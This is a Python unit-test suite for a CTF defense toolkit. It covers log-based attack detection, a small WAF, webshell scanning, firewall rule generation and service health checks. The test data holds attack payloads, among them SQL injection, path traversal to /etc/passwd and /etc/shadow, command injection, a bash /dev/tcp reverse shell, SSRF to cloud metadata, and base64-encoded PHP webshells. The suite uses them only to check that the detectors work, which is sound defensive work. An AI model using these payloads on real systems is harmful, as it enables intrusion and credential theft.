#!/usr/bin/env python3
"""Comprehensive test suite for CTF defense framework."""

import base64
import http.server
import json
import os
import sys
import threading
import time
import unittest
from pathlib import Path

# Add project root to path
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from ctf_defense.colors import Colors, colorize
from ctf_defense.patterns import SIGNATURES, is_benign_static
from ctf_defense.log_analyzer import LogAnalyzer, LogEntry
from ctf_defense.health_checker import HealthChecker, TargetParser
from ctf_defense.firewall import generate_ufw_commands
from ctf_defense.targeted_probe import is_valid_private_ip
from ctf_defense.patch_guides import SNIPPETS


class MockCTFHttpServer(http.server.BaseHTTPRequestHandler):
    """Mock HTTP server simulating CTF service with flags and endpoints."""

    def do_GET(self):
        if self.path == "/health":
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(b'{"status": "UP", "service": "auth-portal"}')
        elif self.path == "/api/secret":
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"Here is the secret token: FLAG{s3cur3_fl4g_t0k3n_1337} and auth_key=9988")
        elif self.path == "/error":
            self.send_response(500)
            self.end_headers()
            self.wfile.write(b"Internal Server Error")
        else:
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(b"<html><body><h1>Team Web Service</h1></body></html>")

    def log_message(self, format, *args):
        pass


class TestCTFDefenseFramework(unittest.TestCase):

    @classmethod
    def setUpClass(cls):
        cls.server_port = 18080
        cls.httpd = http.server.HTTPServer(("127.0.0.1", cls.server_port), MockCTFHttpServer)
        cls.server_thread = threading.Thread(target=cls.httpd.serve_forever)
        cls.server_thread.daemon = True
        cls.server_thread.start()
        time.sleep(0.2)

    @classmethod
    def tearDownClass(cls):
        cls.httpd.shutdown()
        cls.httpd.server_close()

    def test_log_analyzer_sqli_detection(self):
        analyzer = LogAnalyzer(save_file="test_attacks.jsonl")
        raw = '10.10.2.14 - - [22/Aug/2026:20:00:00 +0000] "GET /item.php?id=1%20UNION%20SELECT%201,schema_name,3%20FROM%20information_schema.schemata HTTP/1.1" 200 4520'
        entry = analyzer.parse_line(raw)
        analyzed = analyzer.analyze_entry(entry)

        self.assertTrue(analyzed.is_attack)
        self.assertEqual(analyzed.ip, "10.10.2.14")
        self.assertIn("SQLI", [s.category for s in analyzed.matches])
        self.assertIn("UNION", analyzed.extracted_payload.upper())

    def test_log_analyzer_lfi_detection(self):
        analyzer = LogAnalyzer(save_file="test_attacks.jsonl")
        raw = '10.10.4.99 - - [22/Aug/2026:20:00:00 +0000] "GET /view.php?page=../../../../etc/passwd HTTP/1.1" 200 1200'
        entry = analyzer.parse_line(raw)
        analyzed = analyzer.analyze_entry(entry)

        self.assertTrue(analyzed.is_attack)
        self.assertIn("LFI", [s.category for s in analyzed.matches])

    def test_log_analyzer_rce_detection(self):
        analyzer = LogAnalyzer(save_file="test_attacks.jsonl")
        raw = '10.10.7.3 - - [22/Aug/2026:20:00:00 +0000] "GET /ping.php?host=127.0.0.1;cat%20/flag HTTP/1.1" 200 80'
        entry = analyzer.parse_line(raw)
        analyzed = analyzer.analyze_entry(entry)

        self.assertTrue(analyzed.is_attack)
        self.assertEqual(analyzed.severity, "CRITICAL")
        self.assertIn("RCE", [s.category for s in analyzed.matches])

    def test_log_analyzer_static_benign_filtering(self):
        analyzer = LogAnalyzer(save_file="test_attacks.jsonl", ignore_static=True)
        raw = '10.10.1.1 - - [22/Aug/2026:20:00:00 +0000] "GET /static/css/bootstrap.min.css HTTP/1.1" 200 50000'
        entry = analyzer.parse_line(raw)
        analyzed = analyzer.analyze_entry(entry)

        self.assertFalse(analyzed.is_attack)
        self.assertEqual(analyzed.severity, "NORMAL")

    def test_target_parser_expansion(self):
        ips = TargetParser.expand_range("10.10.1.1-10.10.1.5")
        self.assertEqual(len(ips), 5)
        self.assertEqual(ips[0], "10.10.1.1")
        self.assertEqual(ips[-1], "10.10.1.5")

        oct_ips = TargetParser.expand_range("10.60.1-3.1")
        self.assertEqual(oct_ips, ["10.60.1.1", "10.60.2.1", "10.60.3.1"])

    def test_health_checker_execution_and_token_extraction(self):
        checker = HealthChecker(
            targets=["127.0.0.1"],
            port=self.server_port,
            path="/api/secret",
            delay=0.0,
            log_file="test_health.log",
            token_file="test_tokens.jsonl",
        )
        results = checker.run_all(continuous=False)
        self.assertEqual(len(results), 1)
        res = results[0]

        self.assertTrue(res.is_healthy)
        self.assertEqual(res.status_code, 200)
        self.assertIn("FLAG{s3cur3_fl4g_t0k3n_1337}", res.extracted_tokens)

    def test_micro_waf_owasp_rules(self):
        from ctf_defense.micro_waf import RULES, _deep_decode, _check_payload

        double_encoded = "%252e%252e%252f%252e%252e%252fetc%252fpasswd"
        decoded = _deep_decode(double_encoded)
        self.assertIn("../../etc/passwd", decoded)

        test_payloads = [
            ("A01-LFI", "GET /page.php?file=../../../../etc/shadow HTTP/1.1"),
            ("A01-STREAM", "GET /index.php?page=php://filter/convert.base64-encode/resource=index.php"),
            ("A03-SQLI", "POST /login.php HTTP/1.1\n\nusername=admin' UNION SELECT 1,2,3--"),
            ("A03-SQLI", "GET /api?id=1 AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)"),
            ("A03-NOSQL", 'GET /users?user[$gt]=admin'),
            ("A03-RCE", "POST /tools/ping.php HTTP/1.1\n\nhost=127.0.0.1; id"),
            ("A03-RCE", "GET /cmd?x=`whoami`"),
            ("A03-FLAG", "GET /secret?file=cat%20/flag.txt"),
            ("A03-RSHELL", "GET /run?c=bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"),
            ("A05-SHELL", "GET /c99.php?cmd=id"),
            ("A05-CONFIG", "GET /.env"),
            ("A07-XSS", "GET /search?q=<script>alert(1)</script>"),
            ("A08-DESER", 'POST /session HTTP/1.1\n\nO:8:"Exploit":1:{s:4:"cmd";s:2:"id";}'),
            ("A10-SSRF", "GET /proxy?url=http://169.254.169.254/latest/meta-data/"),
        ]

        for expected_cat, raw in test_payloads:
            dec = _deep_decode(raw)
            combined = f"{raw}\n{dec}"
            match = _check_payload(combined)
            self.assertIsNotNone(match, f"Failed to detect: {raw}")
            rule_id, _ = match
            self.assertEqual(rule_id, expected_cat, f"Wrong rule for {raw}: got {rule_id}, expected {expected_cat}")

    def test_firewall_ufw_command_generation(self):
        cmds = generate_ufw_commands(ssh_port=2222, http_ports=[80, 8080], whitelist_ips=["10.0.0.1"], allow_team_subnet="10.60.0.0/16")
        self.assertIn("ufw default deny incoming", cmds)
        self.assertIn("ufw allow 2222/tcp comment 'SSH Management'", cmds)
        self.assertIn("ufw allow 80/tcp comment 'Web Service'", cmds)
        self.assertIn("ufw allow 8080/tcp comment 'Web Service'", cmds)
        self.assertIn("ufw allow from 10.0.0.1 comment 'SLA Checker Whitelist'", cmds)
        self.assertIn("ufw allow from 10.60.0.0/16 comment 'Team Internal Subnet'", cmds)

    def test_webshell_signatures(self):
        from ctf_defense.webshell_finder import WEBSHELL_PATTERNS
        samples = [
            base64.b64decode(b"PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTsgPz4=").decode("utf-8"),
            base64.b64decode(b"PD9waHAgYXNzZXJ0KGJhc2U2NF9kZWNvZGUoJF9HRVRbJ3gnXSkpOyA/Pg==").decode("utf-8"),
            base64.b64decode(b"PD9waHAgJCRmdW5jKCRfUE9TVFsndGVzdCddKTsgPz4=").decode("utf-8"),
            "c99shell v2.1",
        ]
        for s in samples:
            detected = any(rx.search(s) for _, rx, _ in WEBSHELL_PATTERNS)
            self.assertTrue(detected, f"Failed to detect: {s}")

    def test_targeted_probe_private_ip_filter(self):
        self.assertTrue(is_valid_private_ip("10.60.1.1"))
        self.assertTrue(is_valid_private_ip("192.168.1.100"))
        self.assertTrue(is_valid_private_ip("172.16.5.2"))
        self.assertTrue(is_valid_private_ip("127.0.0.1"))
        self.assertFalse(is_valid_private_ip("8.8.8.8"))
        self.assertFalse(is_valid_private_ip("1.1.1.1"))

    def test_patch_guides_loaded(self):
        self.assertGreaterEqual(len(SNIPPETS), 8)
        categories = {s.category for s in SNIPPETS}
        self.assertIn("SQLi", categories)
        self.assertIn("LFI", categories)
        self.assertIn("RCE", categories)
        self.assertIn("SSTI", categories)

    @classmethod
    def tearDown(cls):
        for fname in ["test_attacks.jsonl", "test_attacks.txt", "test_health.log", "test_tokens.jsonl", "test_tokens.txt"]:
            p = Path(fname)
            if p.exists():
                try:
                    p.unlink()
                except Exception:
                    pass


if __name__ == "__main__":
    unittest.main()
